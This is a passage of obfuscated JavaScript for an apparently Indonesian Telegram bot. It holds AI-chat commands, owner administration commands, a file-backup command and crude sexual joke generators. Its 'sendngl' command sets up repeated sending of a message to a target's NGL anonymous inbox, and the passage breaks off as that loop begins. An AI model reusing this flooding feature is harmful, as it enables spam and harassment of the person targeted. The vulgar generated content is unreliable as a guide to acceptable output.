_0x1ce978[_0x240d04(0x19f0)](_0x476bfb,_0x240d04(0x2972)+_0x240d04(0xbb4)+_0x1ce978[_0x240d04(0x290f)](_0x1ec495,_0x3e6565)+(_0x240d04(0xb1f)+'ontoh\x20peng'+'gunaan:\x0a`')+(_0x1ec495+_0x3e6565)+(_0x240d04(0x138)+_0x240d04(0x173f)+_0x240d04(0x2f9)));let _0x287617=await fetch(_0x240d04(0x25fb)+'i.siputzx.'+'my.id/api/'+_0x240d04(0x109)+_0x240d04(0x267)+'content='+_0x33cfb1),_0x1ca6b6=await _0x287617[_0x240d04(0x1314)]();_0x1ce978['WwGae'](_0x476bfb,_0x1ca6b6['data']);}break;case _0x1ce978[_0x240d04(0x2aa3)]:{if(!_0x33cfb1)return _0x1ce978[_0x240d04(0x20b4)](_0x476bfb,'Kirim\x20peri'+_0x240d04(0xbb4)+(_0x1ec495+_0x3e6565)+('\x20query`\x0a\x0aC'+_0x240d04(0x2000)+_0x240d04(0x796))+_0x1ce978[_0x240d04(0x24ba)](_0x1ec495,_0x3e6565)+(_0x240d04(0x138)+'di\x20maksud\x20'+_0x240d04(0x2f9)));let _0x20f9b5=await _0x1ce978['kGvpo'](fetch,_0x240d04(0x25fb)+'i.siputzx.'+'my.id/api/'+_0x240d04(0x269c)+_0x240d04(0x2ed3)+_0x240d04(0x204)+_0x33cfb1),_0x11efa1=await _0x20f9b5[_0x240d04(0x1314)]();_0x476bfb(_0x11efa1[_0x240d04(0x2bb6)]);}break;case _0x240d04(0x6de):{if(_0x1ce978['KjhNx']!==_0x1ce978[_0x240d04(0x2caf)]){if(!_0x33cfb1)return _0x1ce978[_0x240d04(0x1bcb)](_0x476bfb,_0x240d04(0x2972)+_0x240d04(0xbb4)+_0x1ce978[_0x240d04(0x6f4)](_0x1ec495,_0x3e6565)+(_0x240d04(0xb1f)+'ontoh\x20peng'+_0x240d04(0x796))+(_0x1ec495+_0x3e6565)+(_0x240d04(0x138)+_0x240d04(0x173f)+_0x240d04(0x2f9)));let _0x53a95a=await _0x1ce978[_0x240d04(0x2c17)](fetch,_0x240d04(0x25fb)+_0x240d04(0x2c77)+_0x240d04(0x219a)+_0x240d04(0x2c52)+'k-llm-67b-'+_0x240d04(0xfc5)+'nt='+_0x33cfb1),_0x4786e4=await _0x53a95a[_0x240d04(0x1314)]();_0x1ce978[_0x240d04(0x804)](_0x476bfb,_0x4786e4['data']);}else{if(!_0x184aa9)return _0x4fbc3e('Kirim\x20peri'+_0x240d04(0xbb4)+_0x1ce978['Ezxuo'](_0x149266,_0x38c7c6)+'\x20teks`');_0x17ee48['reply'](_0x240d04(0xcf6)+_0x240d04(0x1d48)+_0x240d04(0xf5b)+_0x240d04(0x1ce5)+_0x240d04(0x2602)+_0x3aef28+'`',{'parse_mode':_0x1ce978[_0x240d04(0xa1b)],'reply_markup':{'inline_keyboard':[[{'text':_0x1ce978[_0x240d04(0x23cb)],'switch_inline_query_current_chat':_0x490974}]]}});}}break;case _0x240d04(0x1977):{if(!_0x33cfb1)return _0x1ce978[_0x240d04(0x27bc)](_0x476bfb,_0x240d04(0x2972)+_0x240d04(0xbb4)+_0x1ce978[_0x240d04(0x2db2)](_0x1ec495,_0x3e6565)+('\x20query`\x0a\x0aC'+_0x240d04(0x2000)+_0x240d04(0x796))+(_0x1ec495+_0x3e6565)+(_0x240d04(0x138)+_0x240d04(0x173f)+_0x240d04(0x2f9)));let _0x398fa8=await fetch(_0x240d04(0x25fb)+_0x240d04(0x2c77)+_0x240d04(0x219a)+_0x240d04(0x12e9)+_0x240d04(0x10ec)+_0x33cfb1),_0x25781b=await _0x398fa8[_0x240d04(0x1314)]();_0x1ce978['etGWG'](_0x476bfb,_0x25781b[_0x240d04(0x2bb6)]);}case _0x1ce978[_0x240d04(0x1636)]:{if(!_0x33cfb1)return _0x1ce978[_0x240d04(0x2490)](_0x476bfb,_0x240d04(0x2972)+'ntah:\x0a`'+_0x1ce978['gYhtZ'](_0x1ec495,_0x3e6565)+(_0x240d04(0xb1f)+_0x240d04(0x2000)+'gunaan:\x0a`')+(_0x1ec495+_0x3e6565)+(_0x240d04(0x138)+'di\x20maksud\x20'+_0x240d04(0x2f9)));let _0x31a4ca=await _0x1ce978[_0x240d04(0x1fcf)](fetch,_0x240d04(0x25fb)+_0x240d04(0x2c77)+_0x240d04(0x219a)+'ai/gemini-'+'pro?conten'+'t='+_0x33cfb1),_0x7df710=await _0x31a4ca[_0x240d04(0x1314)]();_0x1ce978[_0x240d04(0x1275)](_0x476bfb,_0x7df710['data']);}break;case'ai':{if('ZPRJI'===_0x1ce978['DHtLv']){if(!_0x33cfb1)return _0x1ce978['bOtej'](_0x476bfb,_0x240d04(0x2972)+'ntah:\x0a`'+_0x1ce978[_0x240d04(0xd47)](_0x1ec495,_0x3e6565)+('\x20query`\x0a\x0aC'+'ontoh\x20peng'+_0x240d04(0x796))+_0x1ce978[_0x240d04(0x5ba)](_0x1ec495,_0x3e6565)+(_0x240d04(0x138)+'di\x20maksud\x20'+_0x240d04(0x2f9)));let _0x4402ee=await _0x1ce978[_0x240d04(0x3ff)](fetch,_0x240d04(0x25fb)+_0x240d04(0x2c77)+_0x240d04(0x219a)+'ai/gpt3?pr'+_0x240d04(0x58d)+_0x240d04(0x1de0)+_0x240d04(0x225b)+_0x240d04(0x6bb)+_0x240d04(0x2372)+_0x33cfb1),_0x203ae9=await _0x4402ee[_0x240d04(0x1314)]();_0x1ce978[_0x240d04(0x2347)](_0x476bfb,_0x203ae9[_0x240d04(0x2bb6)]);}else _0x1ce978[_0x240d04(0x8bd)](_0x4bd4a9,_0x46da98,_0x251e27[_0x240d04(0x2b45)],_0x240d04(0x2105));}break;case _0x1ce978[_0x240d04(0xa63)]:{if(!_0x33cfb1)return _0x476bfb(_0x240d04(0x2972)+_0x240d04(0xbb4)+_0x1ce978[_0x240d04(0x11ab)](_0x1ec495,_0x3e6565)+(_0x240d04(0xb1f)+_0x240d04(0x2000)+_0x240d04(0x796))+_0x1ce978[_0x240d04(0xb85)](_0x1ec495,_0x3e6565)+(_0x240d04(0x138)+_0x240d04(0x173f)+_0x240d04(0x2f9)));let _0x3bbbdb=await _0x1ce978[_0x240d04(0x6b8)](fetch,_0x240d04(0x25fb)+_0x240d04(0x2c77)+_0x240d04(0x219a)+'ai/dukun?c'+_0x240d04(0x2372)+_0x33cfb1),_0x32e258=await _0x3bbbdb[_0x240d04(0x1314)]();_0x1ce978['vjooU'](_0x476bfb,_0x32e258['data']);}break;case _0x1ce978[_0x240d04(0x2914)]:{if(_0x1ce978[_0x240d04(0x1d38)](_0x1ce978[_0x240d04(0x28b7)],_0x1ce978[_0x240d04(0x28b7)])){if(!_0x33cfb1)return _0x1ce978['YYOeT'](_0x476bfb,_0x240d04(0x2972)+_0x240d04(0xbb4)+_0x1ce978[_0x240d04(0x201a)](_0x1ec495,_0x3e6565)+('\x20query`\x0a\x0aC'+_0x240d04(0x2000)+_0x240d04(0x796))+(_0x1ec495+_0x3e6565)+(_0x240d04(0x138)+_0x240d04(0x173f)+'node\x20js`'));let _0x17f99d=await fetch(_0x240d04(0x25fb)+_0x240d04(0x2c77)+'my.id/api/'+_0x240d04(0x2e81)+_0x240d04(0x2b06)+_0x33cfb1),_0x10d5de=await _0x17f99d['json']();_0x1ce978[_0x240d04(0x85d)](_0x476bfb,_0x10d5de['data']);}else _0x3968d8[_0x240d04(0x15e)](_0x12f413),_0x1ce978['YLiiZ'](_0x2643d9,_0x240d04(0x2720)+_0x240d04(0x1934)+'.');}break;case'sendmessag'+'e':case _0x1ce978[_0x240d04(0x13b4)]:case _0x240d04(0x5c9):{if(!_0x33cfb1[_0x240d04(0x55c)](','))return _0x1ce978[_0x240d04(0x525)](_0x476bfb,_0x240d04(0x13dd)+_0x240d04(0x1631)+_0x240d04(0x132)+_0x240d04(0x103e)+_0x240d04(0x240c));const [_0x18d089,_0x741e65]=_0x33cfb1['split'](',')[_0x240d04(0x16e6)](_0x55b3cc=>_0x55b3cc[_0x240d04(0x2d6d)]());if(!_0x18d089||!_0x741e65||isNaN(_0x741e65))return _0x1ce978[_0x240d04(0xcbc)](_0x476bfb,_0x1ce978[_0x240d04(0x144f)]);try{await _0x23c0de[_0x240d04(0x1986)]['sendMessag'+'e'](_0x741e65,_0x18d089,{'disable_web_page_preview':!![]}),_0x1ce978[_0x240d04(0x62a)](_0x476bfb,'✔️\x20Pesan\x20be'+_0x240d04(0x758)+_0x240d04(0x2727)+_0x741e65+'`');}catch(_0x300129){console[_0x240d04(0x15e)](_0x300129),_0x1ce978[_0x240d04(0xa95)](_0x476bfb,'❌\x20Gagal\x20ki'+'rim\x20pesan:'+'\x0a'+(_0x300129[_0x240d04(0x5fc)+'n']||_0x300129[_0x240d04(0x960)]));}}break;case _0x1ce978['vYzME']:{if(!_0x3cd341)return _0x1ce978[_0x240d04(0xaea)](_0x476bfb,_0x240d04(0x2d5c)+'an\x20owner!');let _0x11cd5a=_0x483c03[0x0];if(!_0x11cd5a)return _0x1ce978[_0x240d04(0x28d1)](_0x476bfb,_0x1ce978[_0x240d04(0x2b59)]);if(!userSpamData[_0x11cd5a])return _0x1ce978[_0x240d04(0x1bce)](_0x476bfb,'User\x20denga'+_0x240d04(0x1d81)+_0x11cd5a+(_0x240d04(0x167c)+'\x20dalam\x20daf'+_0x240d04(0x2475)));delete userSpamData[_0x11cd5a],_0x1ce978[_0x240d04(0x285d)](saveSpamData),_0x1ce978[_0x240d04(0x819)](_0x476bfb,'✅\x20Data\x20spa'+_0x240d04(0x2b9a)+_0x240d04(0xb50)+_0x11cd5a+(_0x240d04(0xa5e)+_0x240d04(0x15db)));}break;case _0x1ce978['hRZlC']:{if(!_0x3cd341)return _0x476bfb(_0x1ce978[_0x240d04(0x955)]);const _0xd6c282=_0x483c03[0x0];if(!_0xd6c282)return _0x1ce978[_0x240d04(0xd5c)](_0x476bfb,_0x240d04(0x1d66)+_0x1ec495+(_0x240d04(0xe3e)+'3456789'));try{if(_0x1ce978[_0x240d04(0xc90)](_0x1ce978[_0x240d04(0x2e57)],_0x1ce978[_0x240d04(0xd1d)])){const _0x30b22b=await _0x1ce978['FBZnl'](_0x182219);if(!Array[_0x240d04(0x1a7e)](_0x30b22b[_0x240d04(0x10ad)]))_0x30b22b[_0x240d04(0x10ad)]=[];if(_0x30b22b['premium'][_0x240d04(0x55c)](_0xd6c282))return _0x240d04(0x1faf)===_0x1ce978[_0x240d04(0x1f2)]?_0x476bfb('User\x20sudah'+_0x240d04(0x1ae0)):_0x11fe1a(_0x1ce978[_0x240d04(0x46f)]);_0x30b22b[_0x240d04(0x10ad)][_0x240d04(0x7dc)](_0xd6c282),await _0x1ce978[_0x240d04(0x3c2)](_0x961430,_0x30b22b),_0x1ce978['IaqSq'](_0x476bfb,_0x240d04(0x848)+'enambahkan'+'\x20'+_0xd6c282+('\x20ke\x20premiu'+'m.'));}else _0x1ce978[_0x240d04(0x10c1)](_0x2ff964,'⏱️\x20Waktu\x20ha'+'bis!\x20Jawab'+_0x240d04(0x26d4)+_0x1ce978['dAAzS'](_0xd67419,_0x307c93)+'*'),delete _0x169dcd[_0x5e807d];}catch(_0x1618d5){if(_0x1ce978[_0x240d04(0x2a02)](_0x240d04(0x119a),_0x1ce978[_0x240d04(0x41f)]))console[_0x240d04(0x15e)](_0x1ce978['cYYTP'],_0x1618d5),_0x1ce978[_0x240d04(0x1d3e)](_0x476bfb,'Gagal\x20mena'+'mbahkan\x20pr'+_0x240d04(0x809)+_0x1618d5['message']);else return![];}}break;case _0x1ce978['USTIM']:{if(!_0x3cd341)return _0x1ce978[_0x240d04(0x1b9)](_0x476bfb,_0x1ce978[_0x240d04(0x955)]);const _0x2c2095=_0x483c03[0x0];if(!_0x2c2095)return _0x1ce978[_0x240d04(0x16ec)](_0x476bfb,_0x240d04(0x1d66)+_0x1ec495+(_0x240d04(0x233b)+_0x240d04(0x1925)));try{if(_0x240d04(0xea2)!==_0x1ce978[_0x240d04(0x2046)])_0x1ce978[_0x240d04(0x9a1)](_0x339d3f,_0x1ce978[_0x240d04(0x1625)](_0x1ce978['OYvlb'],_0x4084dc[_0x240d04(0x960)]));else{const _0x4bcd27=await _0x182219();if(!Array[_0x240d04(0x1a7e)](_0x4bcd27['premium']))_0x4bcd27[_0x240d04(0x10ad)]=[];if(!_0x4bcd27[_0x240d04(0x10ad)]['includes'](_0x2c2095))return _0x476bfb(_0x1ce978[_0x240d04(0x5b2)]);_0x4bcd27[_0x240d04(0x10ad)]=_0x4bcd27[_0x240d04(0x10ad)][_0x240d04(0xfc3)](_0x5880f4=>_0x5880f4!==_0x2c2095),await _0x961430(_0x4bcd27),_0x1ce978[_0x240d04(0x2e82)](_0x476bfb,_0x240d04(0x848)+_0x240d04(0x2994)+_0x2c2095+('\x20dari\x20prem'+_0x240d04(0x1801)));}}catch(_0x40dff3){console[_0x240d04(0x15e)](_0x240d04(0x279c)+_0x240d04(0xe82),_0x40dff3),_0x1ce978[_0x240d04(0xb7b)](_0x476bfb,_0x240d04(0x109e)+_0x240d04(0x2bf4)+_0x240d04(0x23d1)+_0x40dff3[_0x240d04(0x960)]);}}break;case _0x240d04(0x7a5):{if(_0x1ce978['SBKDy'](_0x240d04(0x130e),_0x1ce978['zJhsH']))return _0x4bf41f(_0x7b158c);else{if(!_0x3cd341)return _0x1ce978[_0x240d04(0x1e24)](_0x476bfb,_0x1ce978[_0x240d04(0x955)]);try{if(_0x1ce978['tnjZN'](_0x1ce978['lrazR'],_0x1ce978[_0x240d04(0x8de)])){const _0x33de04=await _0x1ce978[_0x240d04(0x2248)](_0x182219);if(!Array[_0x240d04(0x1a7e)](_0x33de04[_0x240d04(0x10ad)])||_0x33de04[_0x240d04(0x10ad)][_0x240d04(0x2b45)]===0x0)return _0x1ce978[_0x240d04(0x1e86)](_0x476bfb,_0x1ce978['VWnjH']);const _0x45055e=_0x33de04[_0x240d04(0x10ad)][_0x240d04(0x16e6)]((_0x264485,_0x41519d)=>_0x41519d+0x1+'.\x20'+_0x264485)[_0x240d04(0x86e)]('\x0a');_0x1ce978[_0x240d04(0x1255)](_0x476bfb,_0x240d04(0xe0a)+_0x240d04(0x1dff)+'\x0a'+_0x45055e);}else return _0x239841[_0x240d04(0x15e)](_0x52bb4d),_0x59b995(_0x1ce978['GBNUI']);}catch(_0x23a5d6){console[_0x240d04(0x15e)](_0x1ce978[_0x240d04(0x3ad)],_0x23a5d6),_0x1ce978['OMLLD'](_0x476bfb,_0x240d04(0x109e)+_0x240d04(0x1ded)+'ar\x20premium'+':\x20'+_0x23a5d6['message']);}}}break;case _0x1ce978['VufGt']:{if(_0x1ce978[_0x240d04(0x2123)](_0x1ce978['lKoas'],_0x1ce978['wRkHC'])){if(!_0x69d638)return _0x1ce978['aJEZS'](_0x476bfb,_0x240d04(0x2854)+_0x240d04(0x10e4)+_0x240d04(0x239));_0x1ce978[_0x240d04(0xc5d)](_0x476bfb,_0x1ce978['DudRf']);}else{if(!_0x270315)return _0x1ce978['gMmLg'](_0x24f9aa,_0x1ce978['Peuer']);if(!_0x10da4f[0x0])return _0x1ce978[_0x240d04(0x980)](_0x136ac3,_0x240d04(0x1d66)+_0x1a8fbc+(_0x240d04(0x20a2)+'56789'));let _0x505e14=_0x149edf(_0x39ed27[0x0]);if(_0x1ce978['QFHPS'](_0x555c89,_0x505e14))return _0x1ce978[_0x240d04(0x1275)](_0x3eca29,_0x240d04(0x14d3)+_0x240d04(0xe12));_0x1ce978['nmZXS'](_0x2d74ac,_0x505e14),_0x33b4c0('User\x20denga'+_0x240d04(0x1d81)+_0x505e14+(_0x240d04(0x2280)+_0x240d04(0x259)+_0x240d04(0x1eb6)));}}break;case _0x1ce978[_0x240d04(0x2026)]:{if(!_0x3cd341)return _0x1ce978['RbZQJ'](_0x476bfb,'Fitur\x20ini\x20'+'hanya\x20untu'+_0x240d04(0x3ce));_0x1ce978[_0x240d04(0x2e86)](_0x476bfb,_0x1ce978[_0x240d04(0x2d52)]);const _0x296448=_0x240d04(0x1130)+Date[_0x240d04(0x104e)]()+'.zip',_0x185f0a=_0x240d04(0x1c48)+_0x296448,_0x383a2d=fs[_0x240d04(0x1f23)+_0x240d04(0x8ff)](_0x185f0a),_0xcdde2b=archiver(_0x1ce978[_0x240d04(0x2c5)],{'zlib':{'level':0x9}});_0x383a2d['on'](_0x1ce978[_0x240d04(0x2bd4)],async()=>{const _0x433e78=_0x240d04;await _0x23c0de['replyWithD'+_0x433e78(0xaa2)]({'source':_0x185f0a,'filename':_0x296448}),fs[_0x433e78(0x87f)](_0x185f0a);}),_0xcdde2b['on'](_0x1ce978[_0x240d04(0x197d)],_0xcd8b1e=>_0x476bfb('Gagal\x20memb'+_0x240d04(0x1a0f)+':\x20'+_0xcd8b1e[_0x240d04(0x960)])),_0xcdde2b['pipe'](_0x383a2d),_0xcdde2b[_0x240d04(0x13e5)](_0x1ce978[_0x240d04(0x21b0)],{'ignore':[_0x1ce978[_0x240d04(0x1926)],_0x1ce978[_0x240d04(0x220f)],_0x240d04(0x2354)]}),_0xcdde2b[_0x240d04(0x1332)]();}break;case _0x240d04(0x11a1):case'restart':{if(!_0x3cd341)return _0x476bfb(_0x1ce978['QfRaD']);_0x1ce978[_0x240d04(0x2b72)](_0x476bfb,_0x1ce978[_0x240d04(0x18ff)])['then'](()=>{const _0x67d9ba=_0x240d04;process[_0x67d9ba(0x1aaa)]();});}break;case _0x1ce978[_0x240d04(0x7ad)]:{if(!_0x3cd341)return _0x476bfb(_0x1ce978['Peuer']);if(!_0x483c03[0x0])return _0x476bfb(_0x240d04(0x1d66)+_0x1ec495+('ban\x20123456'+_0x240d04(0x106c)));let _0x424ed7=_0x1ce978[_0x240d04(0x28c0)](parseInt,_0x483c03[0x0]);if(_0x1ce978[_0x240d04(0x1093)](isNaN,_0x424ed7))return _0x1ce978[_0x240d04(0x989)](_0x476bfb,_0x1ce978[_0x240d04(0x112a)]);_0x1ce978[_0x240d04(0x1866)](banUser,_0x424ed7),_0x476bfb(_0x240d04(0x1575)+_0x240d04(0x1d81)+_0x424ed7+('\x20telah\x20dib'+_0x240d04(0x158c)));}break;case _0x1ce978['fntZe']:{if(_0x240d04(0x2d06)===_0x1ce978['tAObd']){if(!_0x3cd341)return _0x1ce978[_0x240d04(0x1f31)](_0x476bfb,_0x1ce978[_0x240d04(0x955)]);if(!_0x483c03[0x0])return _0x1ce978[_0x240d04(0x35a)](_0x476bfb,_0x240d04(0x1d66)+_0x1ec495+(_0x240d04(0x20a2)+_0x240d04(0xbd)));let _0x31d965=_0x1ce978[_0x240d04(0x260b)](parseInt,_0x483c03[0x0]);if(_0x1ce978[_0x240d04(0xe26)](isNaN,_0x31d965))return _0x1ce978[_0x240d04(0x2423)](_0x476bfb,_0x1ce978[_0x240d04(0x112a)]);unbanUser(_0x31d965),_0x1ce978['qyuZu'](_0x476bfb,_0x240d04(0x1575)+'n\x20ID\x20'+_0x31d965+(_0x240d04(0x2280)+_0x240d04(0x259)+_0x240d04(0x1eb6)));}else return _0x7c0ca5(_0x1ce978['IYBbO']);}break;case _0x1ce978[_0x240d04(0x8b7)]:{const _0x27db95=_0x23c0de[_0x240d04(0x960)][_0x240d04(0x19ed)]['id'];_0x476bfb(_0x1ce978['AmbTm'](isBanned,_0x27db95)?'Kamu\x20diban'+_0x240d04(0x2ae):_0x1ce978['HbAfe']);}break;case _0x1ce978[_0x240d04(0x139d)]:{if(_0x1ce978[_0x240d04(0x1cdd)]!==_0x1ce978['kjYYr'])return _0x1ce978[_0x240d04(0x985)](_0x5ec11b,_0x1ce978[_0x240d04(0x24a8)]);else{if(!_0x33cfb1)return _0x476bfb(_0x240d04(0x18e1)+_0x240d04(0x2698));_0x476bfb((_0x240d04(0x1374)+_0x240d04(0xd67)+_0x240d04(0x6b9)+_0x240d04(0x322)+_0x33cfb1+(_0x240d04(0x25a3)+':\x20')+_0x1ce978['znFtk'](pickRandom,[_0x1ce978[_0x240d04(0xeca)],_0x240d04(0x20ab)+'k',_0x1ce978['dDLWJ'],_0x1ce978[_0x240d04(0x194e)],_0x1ce978['HnPWt'],_0x1ce978[_0x240d04(0x1228)],_0x240d04(0xbfd)+'y'])+(_0x240d04(0xd28)+_0x240d04(0x164))+pickRandom([_0x1ce978[_0x240d04(0x112)],_0x1ce978[_0x240d04(0x181a)],_0x1ce978['HNkZf'],_0x1ce978[_0x240d04(0x8da)],_0x1ce978['MKHWg'],_0x1ce978[_0x240d04(0x1bd4)],_0x1ce978[_0x240d04(0x1b01)]])+'\x0a•\x20True\x20:\x20'+_0x1ce978[_0x240d04(0x1e9b)](pickRandom,['perjaka',_0x240d04(0x584),_0x1ce978[_0x240d04(0x2aed)],_0x1ce978[_0x240d04(0x86d)],_0x1ce978[_0x240d04(0x90b)]])+('\x0a•\x20Jembut\x20'+':\x20')+_0x1ce978[_0x240d04(0x136)](pickRandom,[_0x1ce978[_0x240d04(0x2284)],_0x1ce978[_0x240d04(0x1d2f)],_0x1ce978[_0x240d04(0x2ad5)],'tipis',_0x1ce978[_0x240d04(0x1cab)]])+'\x0a')[_0x240d04(0x2d6d)]());}}break;case _0x1ce978[_0x240d04(0x2b78)]:{if(!_0x33cfb1)return _0x1ce978[_0x240d04(0x253e)](_0x476bfb,_0x240d04(0x2565)+'ana\x20Mek?');let _0x5a6d27=('\x0a*––––––『\x20'+_0x240d04(0x275f)+'』––––––*\x0a•'+_0x240d04(0x322)+_0x33cfb1+(_0x240d04(0x1a68)+'\x20')+_0x1ce978['rCuWH'](pickRandom,['Ih\x20item',_0x240d04(0x20ab)+'k',_0x1ce978[_0x240d04(0xa34)],_0x1ce978['mxSDf'],_0x1ce978[_0x240d04(0x1004)],_0x1ce978[_0x240d04(0x1228)],'Item\x20Gloss'+'y'])+(_0x240d04(0xcfe)+':\x20')+_0x1ce978['gqJjj'](pickRandom,['Perawan',_0x1ce978[_0x240d04(0x119d)],_0x1ce978[_0x240d04(0xecd)],_0x240d04(0x2205)+'t',_0x1ce978[_0x240d04(0xcae)]])+(_0x240d04(0x2472)+':\x20')+_0x1ce978['NUIXf'](pickRandom,[_0x240d04(0x24cb),_0x1ce978[_0x240d04(0x2d22)],_0x1ce978[_0x240d04(0x15cc)],_0x1ce978[_0x240d04(0x1bc6)],_0x1ce978['JzIdi']])+'\x0a')[_0x240d04(0x2d6d)]();_0x1ce978[_0x240d04(0xe85)](_0x476bfb,_0x5a6d27);}break;case _0x1ce978['HjXch']:{if(!_0x33cfb1)throw _0x240d04(0x1c0b)+'apa?';let _0x15c0cb=_0x33cfb1;request[_0x240d04(0x1a6)]({'headers':{'content-type':_0x1ce978[_0x240d04(0x9b7)]},'url':_0x1ce978[_0x240d04(0x12e1)](_0x1ce978[_0x240d04(0x2340)]+_0x15c0cb,_0x1ce978[_0x240d04(0x15b2)])},function(_0x2ad576,_0x1a5045,_0x3a8a6f){const _0x45c300=_0x240d04;let _0x577cbc=cheerio['load'](_0x3a8a6f);var _0x555b23=_0x577cbc[_0x45c300(0x7b1)]()[_0x45c300(0x1c39)](_0x1ce978[_0x45c300(0x4a6)])[0x1],_0x49fa20=_0x555b23[_0x45c300(0x1c39)](_0x45c300(0x1ad1)+_0x45c300(0xc89))[0x1],_0x521720=_0x555b23[_0x45c300(0x1ba2)](_0x49fa20,'\x20'),_0x8dd773=_0x521720[_0x45c300(0x1ba2)](/<br\s*[\/]?>/gi,'\x0a'),_0x3553ab=_0x8dd773[_0x45c300(0x1ba2)](/<[^>]*>?/gm,'');console[_0x45c300(0x1e13)](_0x1ce978[_0x45c300(0x1880)]('',_0x3553ab)),_0x1ce978[_0x45c300(0x24ef)](_0x476bfb,_0x45c300(0x28ab)+_0x45c300(0x973)+_0x15c0cb+(_0x45c300(0x45c)+_0x45c300(0x2178)+_0x45c300(0x2178)+_0x45c300(0x2178)+_0x45c300(0x2657))+_0x15c0cb+'\x20'+_0x3553ab+('\x0a---------'+_0x45c300(0x2178)+'----------'+'------\x0a'));});}break;case _0x240d04(0x277):{global['wibu']=['Wibu\x20Level'+_0x240d04(0x2669)+_0x240d04(0x23f7)+'h\x20Yaa!',_0x1ce978[_0x240d04(0xb0e)],_0x1ce978['hCcBS'],_0x240d04(0x12f5)+_0x240d04(0x1753)+_0x240d04(0x269f),_0x1ce978['aLtiF'],_0x1ce978[_0x240d04(0x51b)],_0x1ce978['JbDVE'],_0x1ce978[_0x240d04(0x1d11)],_0x1ce978[_0x240d04(0x549)],_0x1ce978[_0x240d04(0x79c)],_0x240d04(0x12f5)+'\x20:\x2071%\x0a\x0aPa'+'sti\x20Lu\x20Pun'+'ya\x20Seribu\x20'+'Waifu',_0x1ce978[_0x240d04(0xda4)],_0x1ce978[_0x240d04(0x2a4)],_0x1ce978[_0x240d04(0x70e)],_0x1ce978[_0x240d04(0xd1b)],_0x1ce978[_0x240d04(0x1124)],_0x1ce978[_0x240d04(0x2e1a)],_0x1ce978[_0x240d04(0x2e1a)],_0x240d04(0x12f5)+_0x240d04(0x2c83)+_0x240d04(0x874)+_0x240d04(0x2bec)+'INI\x20CUY!!!',_0x1ce978[_0x240d04(0x2e1a)]],_0x1ce978['DpCmA'](_0x476bfb,_0x1ce978['Gttgs'](pickRandom,global['wibu']));}break;case _0x1ce978[_0x240d04(0x28cb)]:{try{let _0x4903c7=_0x1ce978[_0x240d04(0x242)],_0x4139f1=[_0x240d04(0x127f)+'mbil\x20uang\x20'+'ortu\x20apa\x20g'+'a?',_0x1ce978[_0x240d04(0x131f)],_0x1ce978['wOBVS'],'Siapa\x20yang'+_0x240d04(0x2e59)+_0x240d04(0x16fb)+_0x240d04(0x2d9f)+'i?',_0x1ce978[_0x240d04(0x5a4)],_0x240d04(0x16ab)+'ling\x20memal'+_0x240d04(0x2442)+_0x240d04(0x242b),_0x1ce978['pCISH'],_0x240d04(0x1f42)+_0x240d04(0x20b8)+_0x240d04(0x2a5)+'\x20gc/luar\x20g'+_0x240d04(0x26b5)+_0x240d04(0x956)+_0x240d04(0x1a32)+'\x20sahabat?('+'boleh\x20beda'+'/sma\x20jenis'+')',_0x1ce978['uhgNI'],'Pernah\x20suk'+_0x240d04(0x25a2)+_0x240d04(0x133)+_0x240d04(0x1616)+'itu\x20suka\x20s'+_0x240d04(0x2a67)+'uga?',_0x1ce978[_0x240d04(0x295b)],_0x1ce978[_0x240d04(0x2036)],_0x240d04(0x165d)+'ikin\x20senen'+'g\x20pas\x20lu\x20l'+'agi\x20sedih\x20'+_0x240d04(0x2c91),_0x1ce978['mfLVX'],_0x240d04(0x254c)+_0x240d04(0x1705)+_0x240d04(0x1c4f),_0x1ce978[_0x240d04(0x1d39)],_0x1ce978[_0x240d04(0xed)],_0x1ce978[_0x240d04(0xd8c)],'Siapa\x20oran'+_0x240d04(0xc9a)+'a\x20membuatm'+_0x240d04(0x61c),_0x1ce978[_0x240d04(0xc93)],_0x1ce978[_0x240d04(0x1597)],'Siapa\x20yang'+_0x240d04(0x2315)+'ndekati\x20ti'+_0x240d04(0x4c2)+_0x240d04(0x2c1b)+_0x240d04(0x1c23),_0x1ce978[_0x240d04(0x12c4)],_0x1ce978['qdENR'],_0x1ce978['qcwRJ'],_0x1ce978[_0x240d04(0xcf7)],_0x1ce978[_0x240d04(0x83e)],_0x1ce978[_0x240d04(0x2bf9)]],_0x25881f=_0x4139f1[Math[_0x240d04(0xf02)](Math[_0x240d04(0x24f1)]()*_0x4139f1[_0x240d04(0x2b45)])];_0x23c0de['replyWithP'+_0x240d04(0x39a)]({'url':_0x4903c7},{'caption':_0x25881f,'parse_mode':_0x1ce978['luyTT'],'reply_markup':{'inline_keyboard':[[{'text':_0x1ce978[_0x240d04(0xe07)],'callback_data':'pepek\x20'+_0x83219d}]]}});}catch(_0x38a1fe){_0x1ce978[_0x240d04(0x1b9)](_0x476bfb,_0x240d04(0x251c));}}break;case'sendngl':{if(!_0x33cfb1[_0x240d04(0x55c)]('|'))return _0x1ce978[_0x240d04(0x26ff)](_0x476bfb,_0x1ce978['PjtKD']);let [_0x4e5f15,_0x482374,_0xf35504]=_0x33cfb1[_0x240d04(0x1c39)]('|')[_0x240d04(0x16e6)](_0x4f4e1e=>_0x4f4e1e[_0x240d04(0x2d6d)]());_0xf35504=_0x1ce978[_0x240d04(0x2335)](parseInt,_0xf35504);if(!_0x4e5f15[_0x240d04(0xed0)](_0x240d04(0x8df)+'l.link/'))return _0x476bfb(_0x1ce978['pSsZy']);if(!_0x482374)return _0x1ce978[_0x240d04(0x1d0)](_0x476bfb,_0x240d04(0x1a0a)+'k\x20boleh\x20ko'+_0x240d04(0x197c));if(_0x1ce978['uygFU'](isNaN,_0xf35504)||_0xf35504<0x1)return _0x1ce978[_0x240d04(0x3c2)](_0x476bfb,_0x240d04(0xeae)+_0x240d04(0x472)+_0x240d04(0x2795)+'0!');let _0x1cbc06=_0x4e5f15[_0x240d04(0x1c39)](_0x240d04(0x8df)+_0x240d04(0x2501))[0x1];if(!_0x1cbc06)return _0x1ce978[_0x240d04(0x2709)](_0x476bfb,'Username\x20N'+_0x240d04(0x114f)+_0x240d04(0x14b7)+'i\x20link!');const _0x18dddb=(..._0x10c3ad)=>import(_0x240d04(0x24b4))[_0x240d04(0xefe)](({default:_0x2c6a4a})=>_0x2c6a4a(..._0x10c3ad)),_0x1eab64=_0x41b223=>new Promise(_0x4e8717=>setTimeout(_0x4e8717,_0x41b223));await _0x476bfb(_0x240d04(0xd11)+_0x240d04(0x529)+_0x240d04(0x2c37)+_0x1cbc06+'\x20sebanyak\x20'+_0xf35504+_0x240d04(0x78d));for(let 